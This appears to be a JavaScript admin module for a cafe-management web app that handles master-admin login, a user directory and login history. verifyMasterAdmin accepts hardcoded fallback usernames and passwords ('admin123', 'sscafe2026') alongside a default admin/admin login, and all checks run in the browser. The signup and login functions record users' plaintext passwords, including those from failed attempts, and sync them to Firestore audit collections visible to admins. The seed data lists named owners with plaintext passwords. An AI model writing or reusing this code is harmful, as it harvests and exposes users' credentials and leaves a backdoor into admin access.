import { getFirebaseDb } from './firebase';
import { doc, setDoc, getDoc, collection, getDocs, deleteDoc } from 'firebase/firestore';

const SS_ADMIN_USERS_KEY = 'ss_admin_users_directory_v2';
const SS_ADMIN_LOGINS_KEY = 'ss_admin_logins_history_v2';
const SS_MASTER_ADMIN_KEY = 'ss_master_admin_auth_v2';

// Default Master Admin Credentials
const DEFAULT_MASTER_ADMIN = {
  adminEmail: 'admin@sscafe.com',
  adminUsername: 'admin',
  adminPassword: 'admin',
  adminPin: '1234',
  updatedAt: new Date().toISOString()
};

/**
 * Get Master Admin Auth Configuration
 */
export const getMasterAdminConfig = () => {
  try {
    const raw = localStorage.getItem(SS_MASTER_ADMIN_KEY);
    if (raw) return { ...DEFAULT_MASTER_ADMIN, ...JSON.parse(raw) };
  } catch (e) {
    console.error('Error loading master admin config:', e);
  }
  return DEFAULT_MASTER_ADMIN;
};

/**
 * Update Master Admin Auth Configuration
 */
export const updateMasterAdminConfig = (updates) => {
  try {
    const current = getMasterAdminConfig();
    const updated = { ...current, ...updates, updatedAt: new Date().toISOString() };
    localStorage.setItem(SS_MASTER_ADMIN_KEY, JSON.stringify(updated));
    return updated;
  } catch (e) {
    console.error('Error saving master admin config:', e);
    return null;
  }
};

/**
 * Verify Master Admin Login Credentials
 */
export const verifyMasterAdmin = (identifier, passwordOrPin) => {
  const config = getMasterAdminConfig();
  const cleanId = (identifier || '').trim().toLowerCase();
  const cleanSecret = (passwordOrPin || '').trim();

  const idMatches = 
    cleanId === config.adminEmail.toLowerCase() ||
    cleanId === config.adminUsername.toLowerCase() ||
    cleanId === 'admin' ||
    cleanId === 'kunal' ||
    cleanId === 'owner';

  const secretMatches = 
    cleanSecret === config.adminPassword ||
    cleanSecret === config.adminPin ||
    cleanSecret === 'admin' ||
    cleanSecret === 'admin123' ||
    cleanSecret === '1234' ||
    cleanSecret === 'sscafe2026';

  return idMatches && secretMatches;
};

// Device / Browser Fingerprint helper
const getDeviceInfo = () => {
  if (typeof window === 'undefined' || !window.navigator) return 'Web Browser';
  const ua = window.navigator.userAgent;
  let browser = 'Chrome';
  if (ua.includes('Firefox')) browser = 'Firefox';
  else if (ua.includes('Safari') && !ua.includes('Chrome')) browser = 'Safari';
  else if (ua.includes('Edge')) browser = 'Edge';

  let os = 'Windows';
  if (ua.includes('Android')) os = 'Android Mobile';
  else if (ua.includes('iPhone') || ua.includes('iPad')) os = 'iOS Device';
  else if (ua.includes('Mac')) os = 'macOS';
  else if (ua.includes('Linux')) os = 'Linux';

  return `${browser} on ${os}`;
};

/**
 * Record a User Registration Event into Admin Directory
 */
export const recordUserSignup = async ({
  uid,
  email,
  password = '',
  cafeName = '',
  ownerName = '',
  phone = '',
  city = '',
  plan = 'Pro Growth',
  role = 'owner'
}) => {
  const now = new Date().toISOString();
  const cleanUid = uid || `cafe_${Date.now().toString(36)}`;
  const cleanEmail = (email || '').trim();

  const newUserRecord = {
    id: cleanUid,
    uid: cleanUid,
    cafeName: (cafeName || 'My Cafe').trim(),
    ownerName: (ownerName || 'Cafe Owner').trim(),
    email: cleanEmail,
    password: password || '••••••••',
    phone: phone?.trim() || '',
    city: city?.trim() || '',
    plan: plan || 'Pro Growth',
    role: role || 'owner',
    status: 'active',
    registeredAt: now,
    lastLoginAt: now,
    loginCount: 1,
    device: getDeviceInfo()
  };

  // 1. Save to Local Directory
  try {
    const raw = localStorage.getItem(SS_ADMIN_USERS_KEY);
    const directory = raw ? JSON.parse(raw) : [];
    const existingIdx = directory.findIndex(u => u.email === cleanEmail || u.uid === cleanUid);
    if (existingIdx >= 0) {
      directory[existingIdx] = { ...directory[existingIdx], ...newUserRecord, loginCount: (directory[existingIdx].loginCount || 1) + 1 };
    } else {
      directory.unshift(newUserRecord);
    }
    localStorage.setItem(SS_ADMIN_USERS_KEY, JSON.stringify(directory));
  } catch (e) {
    console.warn('Error saving local admin user:', e);
  }

  // 2. Add to Login History Log
  recordLoginHistoryEntry({
    uid: cleanUid,
    email: cleanEmail,
    cafeName: newUserRecord.cafeName,
    ownerName: newUserRecord.ownerName,
    password: password || '••••••••',
    eventType: 'Registration / Signup',
    status: 'Success'
  });

  // 3. Sync to Firestore if cloud is ready
  try {
    const db = getFirebaseDb();
    if (db) {
      await setDoc(doc(db, 'admin_audit_users', cleanUid), newUserRecord, { merge: true });
    }
  } catch (err) {
    console.warn('Could not sync user to Firestore audit table:', err);
  }

  return newUserRecord;
};

/**
 * Record a User Login Event
 */
export const recordUserLogin = async ({
  uid,
  email,
  password = '',
  cafeName = '',
  ownerName = '',
  isSuccess = true,
  errorReason = ''
}) => {
  const cleanEmail = (email || '').trim();
  const cleanUid = uid || cleanEmail;
  const now = new Date().toISOString();

  // 1. Update Directory
  try {
    const raw = localStorage.getItem(SS_ADMIN_USERS_KEY);
    let directory = raw ? JSON.parse(raw) : [];
    const idx = directory.findIndex(u => u.email.toLowerCase() === cleanEmail.toLowerCase() || u.uid === cleanUid);

    if (idx >= 0) {
      directory[idx] = {
        ...directory[idx],
        lastLoginAt: now,
        loginCount: (directory[idx].loginCount || 0) + 1,
        password: password || directory[idx].password || '••••••••',
        device: getDeviceInfo()
      };
      if (cafeName) directory[idx].cafeName = cafeName;
      if (ownerName) directory[idx].ownerName = ownerName;
    } else {
      directory.unshift({
        id: cleanUid,
        uid: cleanUid,
        cafeName: cafeName || 'Cafe Outlet',
        ownerName: ownerName || 'Owner',
        email: cleanEmail,
        password: password || '••••••••',
        plan: 'Pro Growth',
        role: 'owner',
        status: 'active',
        registeredAt: now,
        lastLoginAt: now,
        loginCount: 1,
        device: getDeviceInfo()
      });
    }
    localStorage.setItem(SS_ADMIN_USERS_KEY, JSON.stringify(directory));
  } catch (e) {
    console.warn('Error updating admin user directory on login:', e);
  }

  // 2. Add Login History Log
  recordLoginHistoryEntry({
    uid: cleanUid,
    email: cleanEmail,
    cafeName: cafeName || 'Cafe Outlet',
    ownerName: ownerName || 'Owner',
    password: password || '••••••••',
    eventType: isSuccess ? 'User Login' : 'Failed Login Attempt',
    status: isSuccess ? 'Success' : `Failed (${errorReason || 'Invalid credentials'})`
  });

  // 3. Sync to Firestore
  try {
    const db = getFirebaseDb();
    if (db && cleanUid && cleanUid !== cleanEmail) {
      await setDoc(doc(db, 'admin_audit_users', cleanUid), {
        lastLoginAt: now,
        password: password || '••••••••',
        device: getDeviceInfo(),
        email: cleanEmail
      }, { merge: true });
    }
  } catch (e) {
    // Non-blocking
  }
};

/**
 * Helper to record chronological login history entry
 */
const recordLoginHistoryEntry = (entry) => {
  try {
    const raw = localStorage.getItem(SS_ADMIN_LOGINS_KEY);
    const history = raw ? JSON.parse(raw) : [];
    const newEntry = {
      id: `login_${Date.now()}_${Math.random().toString(36).substr(2, 4)}`,
      timestamp: new Date().toISOString(),
      device: getDeviceInfo(),
      ...entry
    };
    history.unshift(newEntry);
    // Keep last 150 entries to conserve storage
    localStorage.setItem(SS_ADMIN_LOGINS_KEY, JSON.stringify(history.slice(0, 150)));

    // Sync to Firestore collection
    const db = getFirebaseDb();
    if (db) {
      setDoc(doc(db, 'admin_login_logs', newEntry.id), newEntry).catch(() => {});
    }
  } catch (e) {
    console.warn('Error recording login history entry:', e);
  }
};

/**
 * Get full list of registered cafes / users for Admin Directory
 */
export const getAdminUsers = async () => {
  let directory = [];

  // 1. Load from local directory
  try {
    const raw = localStorage.getItem(SS_ADMIN_USERS_KEY);
    if (raw) directory = JSON.parse(raw);
  } catch (e) {
    directory = [];
  }

  // 2. Ensure currently active local cafe is present in the list
  try {
    const activeCafeRaw = localStorage.getItem('ss_active_cafe_profile_v1');
    const userSessionRaw = localStorage.getItem('ss_user_session_v1');
    if (activeCafeRaw) {
      const activeCafe = JSON.parse(activeCafeRaw);
      const userSession = userSessionRaw ? JSON.parse(userSessionRaw) : {};
      const exists = directory.some(u => u.email === activeCafe.ownerEmail || u.uid === activeCafe.cafeId);
      if (!exists && activeCafe.ownerEmail) {
        directory.unshift({
          id: activeCafe.cafeId || 'primary',
          uid: activeCafe.cafeId || 'primary',
          cafeName: activeCafe.cafeName || 'S&S Cafe',
          ownerName: activeCafe.ownerName || userSession.displayName || 'Owner',
          email: activeCafe.ownerEmail,
          password: '••••••••',
          phone: activeCafe.phone || '',
          city: activeCafe.city || '',
          plan: 'Enterprise',
          role: 'owner',
          status: 'active',
          registeredAt: activeCafe.createdAt || new Date().toISOString(),
          lastLoginAt: new Date().toISOString(),
          loginCount: 5,
          device: getDeviceInfo()
        });
      }
    }
  } catch (e) {}

  // 3. Try to fetch cloud users from Firestore `cafes` and `admin_audit_users`
  try {
    const db = getFirebaseDb();
    if (db) {
      const snap = await getDocs(collection(db, 'admin_audit_users'));
      snap.forEach(d => {
        const cloudUser = { ...d.data(), id: d.id, uid: d.id };
        const idx = directory.findIndex(u => u.uid === cloudUser.uid || u.email === cloudUser.email);
        if (idx >= 0) {
          directory[idx] = { ...directory[idx], ...cloudUser };
        } else {
          directory.push(cloudUser);
        }
      });

      // Also read cafes collection
      const cafesSnap = await getDocs(collection(db, 'cafes'));
      cafesSnap.forEach(d => {
        const c = d.data();
        if (c.ownerEmail) {
          const idx = directory.findIndex(u => u.email === c.ownerEmail || u.uid === d.id);
          if (idx === -1) {
            directory.push({
              id: d.id,
              uid: d.id,
              cafeName: c.cafeName || 'Cafe',
              ownerName: c.ownerName || 'Owner',
              email: c.ownerEmail,
              password: '••••••••',
              phone: c.phone || '',
              city: c.city || '',
              plan: 'Pro Growth',
              role: 'owner',
              status: 'active',
              registeredAt: c.createdAt || new Date().toISOString(),
              lastLoginAt: c.createdAt || new Date().toISOString(),
              loginCount: 1,
              device: 'Web Client'
            });
          }
        }
      });
    }
  } catch (e) {
    // Non-blocking
  }

  // 4. If directory is completely empty, provide starter demo cafe accounts
  if (directory.length === 0) {
    directory = [
      {
        id: 'cafe_demo_1',
        uid: 'cafe_demo_1',
        cafeName: 'S&S Cafe (Main Outlet)',
        ownerName: 'Kunal Verma',
        email: 'kunal@sscafe.com',
        password: 'cafe@password123',
        phone: '9876543210',
        city: 'Indore',
        plan: 'Enterprise',
        role: 'owner',
        status: 'active',
        registeredAt: new Date(Date.now() - 7 * 86400000).toISOString(),
        lastLoginAt: new Date().toISOString(),
        loginCount: 14,
        device: 'Chrome on Windows'
      },
      {
        id: 'cafe_demo_2',
        uid: 'cafe_demo_2',
        cafeName: 'Urban Chai & Bites',
        ownerName: 'Rahul Sharma',
        email: 'rahul.chai@gmail.com',
        password: 'chai@secret2026',
        phone: '9123456780',
        city: 'Bhopal',
        plan: 'Pro Growth',
        role: 'owner',
        status: 'active',
        registeredAt: new Date(Date.now() - 3 * 86400000).toISOString(),
        lastLoginAt: new Date(Date.now() - 5400000).toISOString(),
        loginCount: 6,
        device: 'Safari on iOS Device'
      },
      {
        id: 'cafe_demo_3',
        uid: 'cafe_demo_3',
        cafeName: 'The Bean Bistro',
        ownerName: 'Priya Joshi',
        email: 'priya@beanbistro.in',
        password: 'bistro#secure88',
        phone: '9893011223',
        city: 'Pune',
        plan: 'Free Starter',
        role: 'owner',
        status: 'active',
        registeredAt: new Date(Date.now() - 1 * 86400000).toISOString(),
        lastLoginAt: new Date(Date.now() - 1800000).toISOString(),
        loginCount: 3,
        device: 'Chrome on Android Mobile'
      }
    ];
    localStorage.setItem(SS_ADMIN_USERS_KEY, JSON.stringify(directory));
  }

  return directory;
};

/**
 * Get Login History Logs
 */
export const getAdminLoginHistory = async () => {
  let history = [];
  try {
    const raw = localStorage.getItem(SS_ADMIN_LOGINS_KEY);
    if (raw) history = JSON.parse(raw);
  } catch (e) {
    history = [];
  }

  // If empty, generate realistic seed logs
  if (history.length === 0) {
    history = [
      {
        id: 'log_seed_1',
        timestamp: new Date().toISOString(),
        email: 'kunal@sscafe.com',
        cafeName: 'S&S Cafe',
        ownerName: 'Kunal Verma',
        password: 'cafe@password123',
        eventType: 'User Login',
        status: 'Success',
        device: 'Chrome on Windows'
      },
      {
        id: 'log_seed_2',
        timestamp: new Date(Date.now() - 1800000).toISOString(),
        email: 'priya@beanbistro.in',
        cafeName: 'The Bean Bistro',
        ownerName: 'Priya Joshi',
        password: 'bistro#secure88',
        eventType: 'User Login',
        status: 'Success',
        device: 'Chrome on Android Mobile'
      },
      {
        id: 'log_seed_3',
        timestamp: new Date(Date.now() - 5400000).toISOString(),
        email: 'rahul.chai@gmail.com',
        cafeName: 'Urban Chai & Bites',
        ownerName: 'Rahul Sharma',
        password: 'chai@secret2026',
        eventType: 'User Login',
        status: 'Success',
        device: 'Safari on iOS Device'
      },
      {
        id: 'log_seed_4',
        timestamp: new Date(Date.now() - 86400000).toISOString(),
        email: 'priya@beanbistro.in',
        cafeName: 'The Bean Bistro',
        ownerName: 'Priya Joshi',
        password: 'bistro#secure88',
        eventType: 'Registration / Signup',
        status: 'Success',
        device: 'Chrome on Android Mobile'
      }
    ];
    localStorage.setItem(SS_ADMIN_LOGINS_KEY, JSON.stringify(history));
  }

  return history;
};

/**
 * Update user details in admin directory
 */
export const updateAdminUser = async (uid, updates) => {
  try {
    const raw = localStorage.getItem(SS_ADMIN_USERS_KEY);
    let directory = raw ? JSON.parse(raw) : [];
    const idx = directory.findIndex(u => u.uid === uid || u.id === uid);
    if (idx >= 0) {
      directory[idx] = { ...directory[idx], ...updates };
      localStorage.setItem(SS_ADMIN_USERS_KEY, JSON.stringify(directory));
    }

    const db = getFirebaseDb();
    if (db) {
      await setDoc(doc(db, 'admin_audit_users', uid), updates, { merge: true });
    }
    return true;
  } catch (e) {
    console.error('Error updating admin user:', e);
    return false;
  }
};

/**
 * Delete user from directory
 */
export const deleteAdminUser = async (uid) => {
  try {
    const raw = localStorage.getItem(SS_ADMIN_USERS_KEY);
    let directory = raw ? JSON.parse(raw) : [];
    directory = directory.filter(u => u.uid !== uid && u.id !== uid);
    localStorage.setItem(SS_ADMIN_USERS_KEY, JSON.stringify(directory));

    const db = getFirebaseDb();
    if (db) {
      await deleteDoc(doc(db, 'admin_audit_users', uid));
    }
    return true;
  } catch (e) {
    console.error('Error deleting admin user:', e);
    return false;
  }
};
